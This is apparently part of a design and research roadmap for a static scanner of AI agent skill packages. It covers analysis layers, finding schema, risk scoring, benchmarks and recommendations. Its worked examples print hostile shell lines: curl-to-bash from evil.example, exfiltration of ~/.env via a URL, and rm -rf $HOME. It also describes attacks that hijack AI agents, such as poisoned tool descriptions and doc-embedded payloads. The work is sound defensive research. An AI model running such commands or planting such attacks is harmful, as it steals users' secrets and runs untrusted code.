- SLSA: referenced for provenance concepts (L1-L3); the registry's
  signing milestone maps to SLSA-style provenance, not to scanner
  output.

### 15.3 Recommendation

Add a `standards` field to findings with a primary mapping
(OWASP ASI or CWE or MCP) plus optional secondary tags. Emit
CycloneDX SBOM as a report format alongside JSON/SARIF. Validate
agentskills.io conformance as check 11. Do not invent a new
taxonomy; map into the existing ones so enterprise reviewers can
route findings without translation.

---
## 16. Proposed architecture

Derived from the research, not assumed. The mission's sketch is
correct in shape; the research changes three things: (1) structure
analysis must come before code analysis, because DDIPE shows
documentation regions are execution vectors and MalSkillBench shows
intent joins code and instructions; (2) capability extraction is the
join point between instructions and code, not an afterthought; (3)
deduplication and correlation are part of the pipeline, not a report
post-processing step.

### 16.1 Pipeline

    Package Parser (layer 1)
          |
    Structural Analysis (layer 2)
          |
    Instruction Classifier (layer 3)
          |
    Language Analysis: AST / shell parser (layer 4)
          |
    Capability Extraction (layer 5)
          |
    Data-flow / Taint (layer 6)
          |
    Security Rules (layer 7)  [the existing checks, rewritten as
                              evidence producers, not verdicts]
          |
    Evidence Correlation (layer 8)
          |
    Risk Engine (layer 9)
          |
    Deduplication + Fingerprinting (layer 10)
          |
    Report (human / JSON / SARIF / CycloneDX)

### 16.2 Layer 1: Package parser

Input: a directory. Output: an artifact model. Parse SKILL.md
frontmatter (name, description, license, compatibility, metadata,
allowed-tools), body sections, code fences with language tags, file
references (scripts/, references/, assets/), and config files
(mcp.json, settings.json, package.json, Dockerfile, workflows).
Validate agentskills.io conformance (name rules, required fields).
The SKILL.md anatomy taxonomy (arXiv:2607.01456) is the component
grammar. Every region is tagged: instruction, example, documentation,
config, script, asset.

### 16.3 Layer 2: Structural analysis

Region classification. Which fences and prose blocks are
agent-executable instructions, which are user-install docs, which are
reference documentation. Features: imperative modality ("run", "use",
"install", "execute"), location in SKILL.md (setup sections,
action sections), fence language, surrounding section headers,
first/second person. This layer kills FP classes 3.2, 3.3, 3.12 and
feeds DDIPE-style example detection (examples the agent is told to
copy are executable regions).

### 16.4 Layer 3: Instruction classifier

Three output classes per region: agent-instruction, user-install-
instruction, documentation-mention. Only agent-instructions feed
severity; user-install instructions feed supply-chain dependency
extraction; documentation mentions feed nothing. This is a
deterministic classifier (fence + header + modality + target
analysis), not an LLM. It is the precision backbone for the shell,
network, and supply_chain checks.

### 16.5 Layer 4: Language analysis

- Python: stdlib ast walker. Calls, imports, string literals,
  control flow, env reads, file opens, subprocess, network, eval/
  exec. Bandit-class depth, zero dependencies.
- Shell: small recursive parser (pipelines, subshells, command
  substitution, variable expansion, heredocs, conditionals) plus a
  command-table for the dangerous verbs (rm, curl, wget, chmod,
  chown, git, npm, pip, docker, ssh, cloud CLIs, base64, tar, dd).
  Output per command: verb, args, targets, scope (HOME, TMPDIR,
  build dirs, dotfiles, absolute), variable provenance (env,
  literal, parameter, unknown), guards (conditional, denied).
- JS/TS: structural approximation now; optional tree-sitter later.
- Markdown: layer 2 handles it.

The command/scope analysis directly answers the mission's core
example: rm -rf $HOME (literal dangerous scope) vs rm -rf
"$TMPDIR/test-output" (tmp scope, likely benign) vs rm -rf ./build
(project scope, routine). Severity becomes scope-driven.

### 16.6 Layer 5: Capability extraction

From layers 3 and 4, emit the capability DAG (section 11). Each
capability node has evidence (file:line), confidence, and a
gated/drift flag. Instructions contribute demanded capabilities;
code contributes provided capabilities; configs contribute
persistence and invocation capabilities.

### 16.7 Layer 6: Data-flow / taint

The intra-file taint engine (section 10) for Python and shell, plus
the one-hop file-reference resolution. Output: taint chains with
per-hop citations.

### 16.8 Layer 7: Security rules

The existing 10 checks become evidence producers. Each rule emits
evidence records (pattern, match span, region class from layer 2,
capability contribution, taint contribution if any) instead of
final findings. Rules keep the deterministic, facts-not-verdicts
discipline. New rule classes: dependency checks (layer 14),
agentskills conformance, tool-description poisoning heuristics for
MCP configs (MSRC/ghostprobe: execution verbs + credential-adjacent
paths + network verbs inside a tool description).

### 16.9 Layer 8: Evidence correlation

The exfiltration pattern from the mission becomes a correlation
rule:

    secret.access (evidence: cat ~/.env)
      + encode (base64)
      + network.upload (curl to host)
      + untrusted destination
      = high-confidence exfiltration chain (one finding, attack path)

    curl https://example.com
      = network.connect, informational

Correlation rules are declarative and testable, like the current
checks. They consume evidence, produce findings with attack paths.
This is where the "six findings for one curl|bash line" collapses
into one explained behavior.

### 16.10 Layer 9: Risk engine

Inputs: capabilities, evidence, taint chains, destination trust,
declared behavior, region class, confidence. Output: severity and
confidence per finding (section 18). Destination trust comes from a
host-tier registry: loopback, private, official-API allowlist,
known-doc allowlist, public-unknown. Public-unknown is the only tier
that escalates.

### 16.11 Layer 10: Deduplication and fingerprinting

- Fingerprint: canonical hash of (rule, region, match span,
  artifact-relative path). Same finding across runs and across
  corpus members is one fingerprint.
- Dedup within a file (one finding per distinct match span), within
  a scan (identical fingerprints merge), across scans (baseline
  support: a fingerprint accepted in a previous run stays accepted
  unless the file changed; the detect-secrets baseline pattern).
- Capability-level dedup: a capability reported once with all its
  evidence, not once per evidence line.

### 16.12 What stays

- The check-module contract (a broken module emits an info finding,
  never kills a scan).
- The prefilter parity discipline (extended to every new layer).
- The per-file caps (extended: caps on capabilities and taint
  chains per file).
- Facts-not-verdicts output language.
- The "injection" word ban in output.

### 16.13 What changes

- Findings become correlated evidence with attack paths, not raw
  pattern matches.
- Severity and confidence split (section 18).
- The scanner knows what a skill is (structure), not just what
  strings it contains.
- Region class gates severity (docs vs instructions vs scripts).

---

## 17. Finding model

### 17.1 Minimum useful schema

    {
      "id": "SKILL-EXFIL-001",            // stable rule id
      "category": "exfiltration",         // capability class
      "severity": "high",                 // risk engine output
      "confidence": 0.8,                  // 0..1, separate from severity
      "evidence": [                       // checkable facts
        {"file": "scripts/sync.sh", "line": 4, "snippet": "..."},
        {"file": "SKILL.md", "line": 45, "snippet": "..."}
      ],
      "capability": "network.upload",
      "attack_path": [                    // for correlated findings
        {"hop": "secret.access", "file": "...", "line": 12},
        {"hop": "encode", "file": "...", "line": 13},
        {"hop": "network.upload", "file": "...", "line": 14}
      ],
      "explanation": "one sentence, plain language",
      "remediation": "one sentence",
      "standards": {"primary": "ASI04", "secondary": ["CWE-200"]},
      "references": ["https://...source..."],
      "fingerprint": "sha256-...",
      "region_class": "script",           // instruction|example|doc|config|script
      "origin": "deterministic"           // or "model-assisted"
    }

### 17.2 Semantics

- id: stable across versions. Renaming a rule breaks baselines; rule
  ids are a public contract.
- severity: what happens if true (impact).
- confidence: how likely the finding is true (veracity). These are
  different questions; the current model conflates them, which is
  why "cleartext http to 127.0.0.1" is high (impact) and absurd
  (veracity) at once.
- evidence: every claim cites file:line with the snippet. A finding
  with no evidence is not a finding (property P1).
- attack_path: optional, present only for correlated findings.
- origin: deterministic by default; model-assisted is always
  labeled and never suppresses deterministic findings.
- region_class: the structural context (layer 2). Report consumers
  filter by it.

### 17.3 What the schema changes for users

The human report shows one line per finding with severity and
confidence both present ("HIGH, conf 0.8 - exfiltration chain").
JSON consumers get attack paths. SARIF gets rule descriptors per id
and confidence in properties. The old flat findings remain
available as evidence in the new model, so no consumer breaks.

---

## 18. Risk model

### 18.1 Principles

1. Severity = impact if true. Confidence = likelihood it is true.
   Two axes, reported separately, calibrated separately.
2. Single facts are low-severity signals. Correlated chains are
   high-severity findings. Evidence aggregation is the core
   operation, not pattern matching.
3. Trust is a first-class input: destination tier, declared
   behavior, region class, credential provenance.
4. The default posture is precision-first: only report what can be
   explained (the philosophy, section 22). A separate review queue
   holds low-confidence semantic signals (SCH-shaped content,
   capability/description mismatch) that are not yet findings.

### 18.2 The scoring shape

    base = rule.impact                        # per rule class
    adjusted = base
      + capability weight                    # secret.access, persistence, upload raise
      + chain bonus                          # evidence chains multiply, not add
      - destination trust                    # loopback/official API sink
      - region class                         # doc mention drops; script raises
      - credential provenance                # config/env read drops; literal raises
      - guard                                # conditional/denied drops
      + declared-behavior mismatch           # drift raises
    confidence = f(evidence count, evidence type, determinism,
                   region certainty, taint certainty)
    review_queue = signals below confidence threshold

### 18.3 Worked examples from the measured corpus

- `curl -s https://evil.example/install.sh | bash` (evil fixture):
  capabilities fetch-remote + process.exec; chain to supply-chain
  rule; destination public-unknown; region script. Result: one high
  finding, confidence 0.95, attack path with both hops. Today: six
  medium/high findings.
- `http://127.0.0.1:8188` (ComfyUI): destination loopback; region
  documentation. Result: not a finding (or info). Today: high.
- `curl "https://evil.example/leak?k=$(cat ~/.env)"` (evil fixture):
  secret.access via command substitution, tainted interpolation
  into URL, public-unknown destination. Result: critical, confidence
  0.9, attack path. Today: high.
- `TOKEN=$(python3 -c "...config.json...['token']")` (telegram
  service): secret-like assignment with config provenance, official
  destination. Result: info or suppressed. Today: high.
- Telegram bot calling api.telegram.org with $TOKEN: official-API
  destination, credential provenance from own config. Result: info.
  Today: high exfil sink.
- SKILL.md says "validates invoice data" but scripts read ~/.ssh and
  curl a public-unknown host: declared-behavior mismatch raises
  confidence of the chain; also emitted as a review-queue signal.
  Today: two unrelated medium findings.

### 18.4 Calibration

The benchmark (section 19) measures severity accuracy and confidence
calibration per release. Threshold profiles follow the One Detector
Fits All finding: registry-publisher profile (very low FPR,
critical/high only) vs enterprise-review profile (higher FPR,
includes medium). The exit-code threshold maps to the profile.

### 18.5 Exploitability and reachability

Reachability gates severity: a destructive command in a script that
nothing invokes is lower risk than one in the skill's main flow.
Inter-file resolution (layer 6) provides the reachability data.
Exploitability (does the path exist, is the data sensitive, is the
destination hostile) is represented by the capability weights and
destination tier; a full CVSS-style computation is out of scope and
not justified for artifact review.

---
## 19. Benchmark design

Mandatory, per the mission. The benchmark exists to prevent
"improving" the scanner by making it quieter. It is the contract
that Phase 1 (noise removal) cannot delete true positives and Phase
2+ (deeper analysis) cannot add noise.

### 19.1 Corpus

Benign corpus (realistic legitimate skills):

- The existing good_skill fixture, extended.
- A curated subset of anthropics/skills and the user's own registry
  packages (they are authoring-gated and scanned clean under the
  current contract; they are the best available "legit" sample).
- Skills exercising every FP class in section 3 on purpose: markdown
  inline code, fences, localhost APIs, docs install instructions,
  config-file secret reads, official-API calls, defensive deny
  lists, token-format documentation.
- Skills with genuinely risky but legitimate behavior: build tools
  that rm build dirs, install scripts with pinned deps, security
  tooling that reads credentials and talks to the network (e.g. a
  credential-rotation skill). These must produce findings, but at
  calibrated severity, never critical for the benign activity.
- N=200 minimum, grown over time; each file labeled with expected
  findings per rule class.

Malicious corpus:

- Seed with MalSkillBench's runtime-verified dataset (3,944
  malicious skills, 108-cell taxonomy, 4,000 matched benign). This
  is the single best external resource the research surfaced; using
  it makes AgentScan comparable with every detector MalSkillBench
  evaluated (SkillSpector, Cisco, and others) on the same ground
  truth.
- The existing evil_skill fixture family, extended per check.
- Attack-style additions: DDIPE-style doc-embedded payloads, SCH-
  style compliance-rule text, dependency-steering skills, poisoned
  MCP tool descriptions, rug-pull pairs (benign v1, malicious v2,
  to test drift detection).
- Obfuscated variants: base64, hex, charcode, nested eval, split
  strings, for the evasion suite.

### 19.2 Metrics

Per release, reported in the README and enforced in CI:

- Precision: TP / (TP + FP).
- Recall: TP / (TP + FN) on the malicious corpus.
- False-positive rate: FP / benign corpus size.
- False-negative rate: FN / malicious corpus size.
- Severity accuracy: fraction of findings whose severity matches the
  corpus label (benign activity must not be critical).
- Confidence calibration: for confidence buckets (0-0.2, ...,
  0.8-1.0), the observed true rate must track the bucket (the
  PromptShield low-FPR regime lesson).
- Scan time on a fixed corpus (regression guard).
- Detection profile per MalSkillBench behavior class: code
  injection, prompt injection, agent-control. This is the metric
  that stops the scanner from quietly becoming a code-injection-
  only detector.

### 19.3 Anti-quieting guardrails

- The malicious corpus has a minimum recall per behavior class, not
  just overall (a scanner that stops reporting prompt patterns can
  keep overall recall by being good at code injection).
- Severity accuracy is a pass/fail gate, not a report: inflating
  severity to raise recall fails the gate.
- Benign corpus findings are reviewed per release; any new benign
  finding requires either a fix or a documented, deliberate
  exception.
- Wild evaluation is a bonus report, never the gate (MalSkillBench:
  wild-only scoring swings rankings by up to 66 recall points).
- Runtime-verified labels (MalSkillBench) are the ground truth, not
  pattern matches from our own rules (no circularity).

### 19.4 Benchmark harness

A separate repo directory `bench/` with: corpora (git-LFS or
download script), a runner script that executes the scanner and
computes metrics, and a golden-results JSON committed per release.
The harness runs offline; MalSkillBench downloads happen once at
setup. CI runs the harness on every change to checks or layers.

---

## 20. False-positive strategy

### 20.1 Principles adopted

1. Every FP class gets a named fix with a benign fixture, following
   the project's existing precision discipline. Section 3 already
   assigns a fix per class.
2. FPs are removed at the analysis layer, not by appending
   exceptions to regexes. A regex exception for ".zshrc" is a
   whack-a-mole; a token-boundary-aware shell-context check removes
   the class.
3. Baseline support (detect-secrets pattern): a fingerprint accepted
   in a previous run stays accepted unless its file changes. This is
   the honest form of suppression: visible, recorded, reversible.
4. Suppression is always with a reason and a fingerprint; silent
   allowlists are forbidden (IaC-scanner lesson).
5. Region class is the primary noise filter: docs mention nothing,
   instructions and scripts everything.
6. Destination trust is the secondary filter: loopback and official
   APIs do not escalate.
7. Confidence is the escape valve: what cannot be decided stays in
   the review queue, visible but not a finding, rather than being
   either noise or silence.

### 20.2 Feedback loop

- The benchmark's benign corpus is the regression net.
- Real-world scans (registry packages, user skills) are re-run per
  release; new FP classes are added to section 3's taxonomy and the
  corpus.
- The registry's audit pipeline becomes the dogfood: every audit
  finding on a legit package is an FP or a mislabel, and both are
  feed the corpus.
- A `--baseline` flag writes accepted fingerprints; a
  `--baseline-check` verifies drift (fingerprint changed = re-review
  trigger, the rug-pull defense).

### 20.3 What FP strategy must not become

- It must not become "suppress until clean" (the anti-quieting
  guardrails in 19.3).
- It must not hide real chains behind noise removal. The
  correlation engine (layer 8) must be verified to still fire on
  the evil fixture after Phase 1.

---

## 21. Implementation roadmap

Order derived from research:

- Phase 1 first, because the measured noise (70% of findings) is
  pure cost with zero security value, and because every later phase
  produces findings that must be read against a quiet baseline.
- Structural analysis (Phase 2) before code analysis (Phase 3),
  because DDIPE and the FP taxonomy both show region context gates
  everything.
- Capability extraction rides on Phases 2-3; it is the join point.
- Data-flow (Phase 3) before instruction semantics (Phase 4),
  because taint is deterministic and testable, while instruction
  semantics edges into the review-queue/LLM zone.
- Supply chain (Phase 5) is mostly additive and can land any time
  after Phase 1; it is placed after 4 to keep dependency extraction
  honest (instruction-classifier feeds it).
- Dynamic (Phase 6) and LLM (Phase 7) are optional and explicitly
  opt-in; neither blocks the others.

### Phase 0 - Baseline (done)

Current scanner, benchmark scaffolding, corpus seeds, CI harness.

### Phase 1 - False-positive reduction

The section 3 fixes: fence-aware shell check, token-boundary fixes,
host-trust tiering (loopback/private), license at skill granularity,
config-read provenance exemption, docs-context secret downgrade,
official-API destination registry, defensive-context detection,
per-span dedup, walker exclusions (.next, lockfiles). Plus the
benchmark gate and the evil-fixture correlation smoke test.
Target: ~70% finding reduction on the measured corpus with zero
recall loss on the malicious corpus.

### Phase 2 - Structure and language analysis

Artifact model (layer 1), region classifier (layer 2), instruction
classifier (layer 3), Python AST walker and shell parser (layer 4).
The shell command/scope table (rm, curl, wget, chmod, chown, git,
npm, pip, docker, ssh, cloud CLIs) with path-scope and variable
provenance. This delivers the mission's "rm -rf $HOME vs rm -rf
./build" distinction.

### Phase 3 - Capabilities and data flow

Capability extraction (layer 5), intra-file taint for Python and
shell, inter-file one-hop resolution (layer 6). Findings gain
attack paths. The exfiltration correlation rule ships here.

### Phase 4 - Agent-instruction analysis

Location-aware prompt-pattern analysis (region class + capability
correlation instead of keyword matching), tool-description poisoning
heuristics for MCP configs (execution verbs + sensitive paths +
network verbs in descriptions), declared-vs-observed capability
drift detection, review queue for SCH-shaped content and
compliance-rule phrasings.

### Phase 5 - Supply chain

Dependency extraction, pin detection, OSV lookup (optional,
offline-fallback), typosquat/confusion heuristics, skill SBOM
(CycloneDX) output.

### Phase 6 - Optional dynamic analysis (architecture)

The sandbox design from section 12: separate opt-in binary, Linux
bubblewrap + seccomp + network namespace, telemetry format already
defined in the finding model. Not built until the telemetry schema
is exercised by the static pipeline.

### Phase 7 - Optional LLM analysis (architecture)

The review-queue triage from section 13: gated by deterministic
locators, labeled model-assisted, never suppresses deterministic
findings, pinned model and prompt versions, offline-degrading,
cost-capped.

### Research-driven ordering note

MalSkillBench's "reason jointly over intent, code, and
instructions" is the end state (Phases 2-4 together). SCH's 0.00%
detection is the honest boundary: Phase 4 makes SCH-shaped content
reviewable, it does not claim detection. Dynamic and LLM close
specific gaps and do not change the deterministic core.

---
## 22. Security philosophy and prioritized work items

### 22.1 The philosophy decision

The mission offered two poles: "never miss anything" versus "only
report what we can explain and justify", with the suspicion that
the right answer is "high-signal security analysis with explainable
evidence". The research settles it:

- MalSkillBench: no detector covers the hybrid space; the ones that
  maximize recall on code injection collapse on instruction attacks.
  "Never miss anything" is unachievable and, as a product claim,
  would be a lie the first week.
- CSA: scanners that miss semantic attacks produce "false confidence
  rather than genuine protection". A scanner that reports everything
  trains reviewers to ignore everything; that is worse than silence.
- One Detector Fits All: FPR is a product decision per audience,
  and the two audiences (registry publishers, enterprise reviewers)
  need different profiles. A single "report all" posture serves
  neither.
- The business context (section 2.7): every finding in a registry
  audit is a statement about a package author. False accusations
  burn the trust the badge depends on.

The philosophy is therefore: high-signal security analysis with
explainable evidence. Concretely: (1) deterministic findings are
facts with evidence, calibrated for the audience profile; (2) what
cannot be explained is not a finding, it is a review-queue signal;
(3) the scanner optimizes precision at the finding level and recall
at the behavior-class level (no class may go silent); (4) every
major claim the scanner makes is either measured (benchmark) or
cited (research).

### 22.2 Prioritized work items

Ordered by value/effort. Phase tags match section 21.

P0 (do first, small, high impact):
1. Benchmark harness + corpus seeds (P1): the gate everything else
   passes through.
2. Fence-aware, token-boundary shell check (P1): removes the
   largest noise class (3,508 findings).
3. Per-span dedup + label fix in the combined-regex checks (P1):
   the 69-findings-on-57-lines problem.
4. Host-trust tiering: loopback/private suppression (P1).
5. License at skill granularity (P1).

P1 (core v2 analysis):
6. Artifact model + region classifier (P2): structure before code.
7. Instruction classifier (P2): docs vs instructions vs examples.
8. Python AST walker (P2): the first real language analysis.
9. Shell parser + command/scope table (P2): rm -rf $HOME vs
   ./build; curl/wget/git/npm/pip/docker/ssh/cloud verbs.
10. Capability extraction (P3): the join point.
11. Intra-file taint (P3): exfiltration chains with attack paths.
12. Correlation engine (P3): one behavior, one finding.

P2 (agent-specific and supply chain):
13. Location-aware instruction analysis + review queue (P4).
14. MCP tool-description poisoning heuristics (P4).
15. Drift detection: declared vs observed capability (P4).
16. Dependency extraction + OSV + typosquat (P5).
17. CycloneDX SBOM output (P5).

P3 (optional, architected now, built later):
18. Sandbox design doc and telemetry schema (P6).
19. LLM triage stage spec (P7).

P4 (platform):
20. Baseline fingerprint support (--baseline / --baseline-check).
21. Threshold profiles (registry vs enterprise) per One Detector
    Fits All.
22. Skill posture scorecard (Scorecard-shaped) + agentskills.io
    conformance check.

---

## 23. Tradeoffs

### 23.1 Precision vs recall

Precision-first is the chosen default; recall at the behavior-class
level is the floor. The tradeoff is explicit: some payload-less
attacks will stay in the review queue, not the findings list. The
alternative (recall-first) buries the real findings and burns
reviewer trust. The benchmark makes the tradeoff measurable and
reversible per audience profile.

### 23.2 Determinism vs semantic coverage

Deterministic analysis is reproducible and auditable; it cannot
detect SCH-class attacks. LLM analysis can flag them but is
nondeterministic and injectable. The resolution: deterministic
engine owns the findings; LLM owns a labeled, optional triage layer
that cannot suppress deterministic output. This costs some semantic
coverage in the default path and some LLM utility (the LLM never
gets the last word), which is the correct trade for an audit
product.

### 23.3 Depth vs speed and dependency discipline

AST + taint adds depth but costs engineering time and, for JS,
would cost the zero-dependency property. Resolution: Python (stdlib
ast) and shell (own parser) are first-class; JS stays structural
until an optional tree-sitter tier is justified by benchmark demand.
This leaves a JS-shaped blind spot that the benchmark's
behavior-class metrics will expose honestly.

### 23.4 Local-first vs external data

OSV lookup and destination-trust curation need external data; the
product identity is offline-first. Resolution: offline by default,
external lookups opt-in per scan with cached results, and the
scanner degrades with an explicit "not checked" note rather than
silence. Destination trust ships as a bundled, versioned allowlist
(the official-API tier) that is itself reviewed content.

### 23.5 Sandbox value vs sandbox risk

Dynamic analysis catches runtime behavior; executing untrusted
skills is the attack. Resolution: sandbox is opt-in, separate
binary, Linux-only v1, and its findings are labeled "observed in
sandbox". Building it later costs nothing if the telemetry schema
is fixed now.

### 23.6 Speed vs thoroughness

The process-pool architecture is tuned for corpora. The correlation
engine and taint add per-file cost; the caps (files, findings,
capabilities, chains) bound the worst case. The benchmark's scan-
time metric keeps this honest.

---

## 24. What NOT to build

Explicitly excluded, with reasons:

1. More regexes as the primary strategy. The FP taxonomy proves the
   next 50 regexes would produce the next 50 exceptions. Structure
   and correlation replace them.
2. LLM for everything. Nondeterministic, injectable, costly,
   unreproducible for audits. Gated triage only.
3. Scan everything, report everything. Security theater; trains
   reviewers to ignore output. The philosophy rejects it.
4. Rule-count inflation. The benchmark scores behavior classes, not
   rule counts. Rules are evidence producers now.
5. Arbitrary severity inflation. Severity accuracy is a benchmark
   gate.
6. Unexplained AI-generated findings. Every finding has evidence;
   model-assisted findings are labeled and cite their deterministic
   basis.
7. A verdict language. The scanner never says malicious. The human
   owns the verdict. The word "injection" stays out of output.
8. A self-hosted vulnerability database. OSV exists.
9. Full interprocedural, inter-file taint (CodeQL tier). Not
   justified at artifact scale; one-hop resolution is the ceiling
   that pays.
10. Symbolic execution / abstract interpretation. Research-grade,
    out of scope for a local stdlib scanner.
11. Executing artifacts in the scanner core. Sandbox is separate,
    opt-in, later.
12. Reputation scoring of package authors or hosts. Destination
    trust is curated and small; reputation is a data-company
    problem, not a scanner problem.
13. A registry/marketplace inside the scanner. The distribution
    layer exists separately; the scanner stays a scanner.
14. CVSS-style exploitability computation. Artifact review does not
    need it; capability weights + destination tier cover the
    decision space.
15. Windows/macOS sandboxing in v1 of the sandbox. Platform honesty
    beats fake coverage.

---

## 25. Open research questions

Items the research surfaced but did not settle. Each is a decision
the implementation phase should revisit with fresh data.

1. Does the review queue convert to findings at an acceptable
   precision in practice? (SCH-shaped content is the test set.)
2. What is the right confidence threshold split between the
   registry-publisher and enterprise profiles? (One Detector Fits
   All suggests 0.1% vs 10% FPR; the artifact domain may differ.)
3. Can a deterministic instruction classifier reach the precision
   of the LLM locator in Locate-and-Judge at skill scale, or is the
   LLM locator the right gate for the review queue?
4. Which MalSkillBench behavior classes should the benchmark
   weight most, given the wild distribution is narrow (one
   crypto-theft campaign dominated)? The wild tail (agent-control
   attacks) is architecturally new and under-represented.
5. Is the official-API destination allowlist maintainable by one
   person, and does it need a community mechanism (the npm
   allowlist arc suggests yes, eventually)?
6. Does drift detection (declared vs observed capability) need
   versioned skill manifests to be useful, and who mints them?
   (The registry's signing milestone is the natural owner.)
7. What does an agent-artifact SBOM actually contain once skills
   reference skills? (CycloneDX has no first-class agent-skill
   component type yet.)
8. Does the JS-shaped blind spot show up in the benchmark as a
   behavior-class recall failure, or is the structural
   approximation enough? (Measure before building tree-sitter.)
9. At what skill size does intra-file taint start producing
   meaningful chains, and is one-hop inter-file resolution
   sufficient for real exfiltration cases?
10. Can a sandbox run of a skill produce evidence that changes
    severity without becoming a verdict? (The "observed in sandbox"
    label is proposed; its calibration is untested.)
11. What is the false-positive cost of flagging unpinned skill-to-
    skill references, given skills are currently distributed as
    frozen tarballs?
12. Should the scanner emit a skill posture score (Scorecard-
    shaped) when the underlying checks are still calibrating?
    (Premature scoring could mislead more than inform.)

---

## 26. Major recommendations (card format)

For each: problem, evidence, solution, expected benefit,
implementation complexity, security implications, FP implications,
FN implications, priority.

### R1. Benchmark harness before any behavioral change
- Problem: no ground truth; any change is unverifiable and the
  scanner can be "improved" by going quiet.
- Evidence: MalSkillBench (2606.07131) shows wild-only evaluation
  swings rankings by up to 66 recall points; runtime-verified labels
  are the only unbiased ground truth.
- Solution: bench/ directory, benign + malicious corpora, metrics
  per behavior class, CI gate (section 19).
- Benefit: every later change is measured; comparable with
  SkillSpector/Cisco on shared ground truth.
- Complexity: low-medium (harness is script work; corpus download
  once).
- Security implications: none negative; ground truth is Docker-
  verified by MalSkillBench, not by us.
- FP implications: benign corpus becomes the FP regression net.
- FN implications: behavior-class recall floor prevents silent FN
  growth.
- Priority: P0.

### R2. Fence-aware, token-boundary shell analysis
- Problem: 45% of corpus findings are markdown code spans and fence
  lines flagged as shell.
- Evidence: measured 3,508 backtick + 864 fence findings on 182
  skills (section 3.1, 3.2).
- Solution: shell check only inside shell contexts (scripts,
  fences, heredocs); fence opener lines skipped; \bzsh\b fixed at
  token boundaries (.zshrc no longer matches).
- Benefit: ~4,400 findings removed; the remaining shell findings
  become meaningful.
- Complexity: low.
- Security implications: none; no detection surface is lost (real
  shell in fences and scripts still analyzed).
- FP implications: removes the two largest classes.
- FN implications: none expected; verified by parity test + evil
  fixture.
- Priority: P0.

### R3. Evidence correlation engine (one behavior, one finding)
- Problem: a curl|bash line yields 6 uncorrelated findings; the
  behavior exists only in the human's head.
- Evidence: evil fixture 69 findings on 57 lines with same-title
  duplicates (section 2.6, 3.10); MalSkillBench's joint-reasoning
  conclusion.
- Solution: layer 8 correlation rules consume evidence and emit
  findings with attack paths; per-span dedup in the combined-regex
  checks.
- Benefit: readable reports; the exfiltration chain becomes one
  critical finding with cited hops.
- Complexity: medium.
- Security implications: correlation must never merge distinct
  behaviors; each finding keeps its evidence list.
- FP implications: reduces duplicates; correlation rules get their
  own benign fixtures.
- FN implications: risk of over-merging distinct signals; guarded
  by per-hop evidence retention.
- Priority: P0-P1.

### R4. Host-trust tiering
- Problem: loopback/private cleartext and IP-literal findings at
  high severity.
- Evidence: 50 cleartext + 35 IP-literal findings on loopback/
  private/placeholder hosts (ComfyUI local API) (section 3.4).
- Solution: destination tiers (loopback, private, official-API
  allowlist, doc allowlist, public-unknown); only public-unknown
  escalates.
- Benefit: removes absurd highs; public-IP-literal findings stay
  visible.
- Complexity: low.
- Security implications: metadata-service URLs (169.254.169.254)
  remain high (SSRF class); only loopback/private drop.
- FP implications: large removal, all defensible.
- FN implications: an attacker using loopback as an exfil target
  (e.g. local proxy) would drop; mitigated by keeping loopback
  findings at info with a note.
- Priority: P0.

### R5. Python AST + shell parser with command/scope tables
- Problem: the scanner cannot distinguish rm -rf $HOME from rm -rf
  ./build, or an assignment from a config read.
- Evidence: mission example; measured config-read FPs (21
  "Secret-like assignment" highs on legit scripts, section 3.9);
  Bandit proves stdlib AST covers a real rule catalog.
- Solution: layer 4 language analysis; scope classification
  (HOME, TMPDIR, project, dotfile, absolute); variable provenance
  (env, config, literal, unknown).
- Benefit: severity becomes scope-driven; the flagship
  "understand the command" capability lands.
- Complexity: medium-high (shell parser is the real work).
- Security implications: better discrimination of true destructive
  scope; no detection loss (all current patterns re-expressed as
  parsed commands).
- FP implications: removes scope-blind highs on tmp/project paths.
- FN implications: parser gaps must be benchmark-measured; unknown
  constructs default to the current behavior (flag), never silence.
- Priority: P1.

### R6. Capability graph with declared-vs-observed drift
- Problem: flat findings cannot represent combinations or the
  rug-pull pattern.
- Evidence: MSRC finance chain (every action legitimate, trust
  boundary is the vuln); 2605.11418 (metadata-only attacks);
  MalSkillBench joint reasoning.
- Solution: layer 5 capability DAG per artifact; drift detection
  against description/allowed-tools; version-to-version drift as a
  re-review trigger.
- Benefit: attack paths, least-privilege review, rug-pull defense.
- Complexity: medium-high.
- Security implications: the drift signal is the scanner-side
  answer to approval-caching attacks (MCPoison, tj-actions).
- FP implications: mismatch findings need calibration (declared
  behavior is often vague); keep as low-confidence/review-queue
  initially.
- FN implications: drift needs a declared baseline; skills without
  one get capability-only analysis.
- Priority: P1.

### R7. Intra-file taint for exfiltration chains
- Problem: secret-read -> encode -> upload exists across lines, not
  just same-line.
- Evidence: mission flows; Semgrep taint model (sources/
  propagators/sanitizers/sinks) verified from docs; DySec and CHASE
  show the deterministic/dynamic split.
- Solution: layer 6 taint for Python + shell; tainted-value-reaches-
  sink findings with per-hop citations.
- Benefit: the exfiltration detection the current exfil check only
  approximates; replaces same-line heuristics with real flow.
- Complexity: medium.
- Security implications: taint is sound within its language scope;
  dynamic dispatch treated as sink.
- FP implications: sanitizer handling is the risk; sanitizers must
  be explicit and tested.
- FN implications: cross-process and runtime flows missed; sandbox
  (P6) closes part of that.
- Priority: P1.

### R8. Agent-instruction analysis and review queue
- Problem: payload-less attacks (SCH) achieve 0.00% detection;
  naive keyword matching is both noisy and useless against them.
- Evidence: 2605.14460 (77.67% exfil, 67.33% RCE, 0.00% detection);
  2604.03081 (DDIPE, 11.6-33.5% bypass); measured FP classes 3.3,
  3.6.
- Solution: location-aware instruction analysis (region class +
  capability correlation + demanded-authority heuristics), with
  low-confidence signals routed to a labeled review queue instead
  of findings.
- Benefit: SCH-shaped content becomes reviewable; the scanner stops
  pretending keywords detect intent.
- Complexity: medium (deterministic v1); the LLM triage (R11) can
  later judge the queue.
- Security implications: the review queue is honest about the
  scanner's boundary (P8); no detection claims.
- FP implications: queue items are not findings; noise is contained
  by labeling.
- FN implications: acknowledged; queue is a bridge, not a detector.
- Priority: P2.

### R9. Supply-chain dependency analysis with OSV
- Problem: skills pull dependencies; the ecosystem is being
  exploited through them (typosquat MCP, dependency steering).
- Evidence: 2605.09594 dependency steering; tj-actions CVE-2025-
  30066; OSV-Scanner verified current and keyless.
- Solution: dependency extraction, pin detection, OSV lookup
  (opt-in, cached, offline-degrading), typosquat/confusion
  heuristics, CycloneDX SBOM.
- Benefit: "what does this skill pull in, and is it known-bad" as a
  report section; enterprise story.
- Complexity: medium.
- Security implications: OSV is authoritative vuln data; heuristics
  are clearly labeled as heuristics.
- FP implications: instruction-classifier gates install flags (docs
  are not behavior).
